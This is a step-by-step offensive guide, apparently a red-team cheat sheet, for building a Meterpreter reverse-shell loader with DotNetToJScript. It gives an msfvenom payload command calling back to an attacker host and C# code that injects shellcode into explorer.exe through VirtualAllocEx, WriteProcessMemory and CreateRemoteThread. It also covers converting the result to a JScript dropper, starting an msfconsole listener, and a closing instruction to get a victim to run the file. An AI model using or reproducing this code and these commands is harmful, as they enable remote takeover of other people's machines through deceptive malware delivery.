# Meterpreter Loader with DotNetToJScript

### 1) Download DotNetToJScript project

    git clone https://github.com/tyranid/DotNetToJScript

### 2) Craft payload

    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=[PORT] EXITFUNC=thread -f csharp

### 3) Modify the code in TestClass.cs and enter your payload

    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.IO;
    using System.Linq;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Windows.Forms;
    //using System.Threading.Tasks;
    
    [ComVisible(true)]
    public class TestClass
    {
    
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        public TestClass()
        {
            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            
            // INSERT YOUR PAYLOAD HERE
            byte[] buf = new byte[760] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
    0xcc,0x00,0x00,...,0x51,0x56,0x48,
    0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5};
    
            IntPtr outSize;
    
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
    
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    
        public void RunProcess(string path)
        {
            Process.Start(path);
        }
    }

### 4) In the Program.cs file, comment lines 154-158

    if (Environment.Version.Major != 2)
    {
        WriteError("This tool should only be run on v2 of the CLR");
        Environment.Exit(1);
    }

### 5) Compile the whole project for Release

    dotnet build .

### 6) Run the tool to get the .js code

    .\DotNetToJScript\bin\x64\Release\DotNetToJScript.exe .\ExampleAssembly\bin\x64\Release\ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js

### 7) Start listener

    sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKR_IP]; set lport [PORT]; exploit"

### 8) Find a way to deliver the .js file to the user and that he executes it, then you should get your reverse shell.
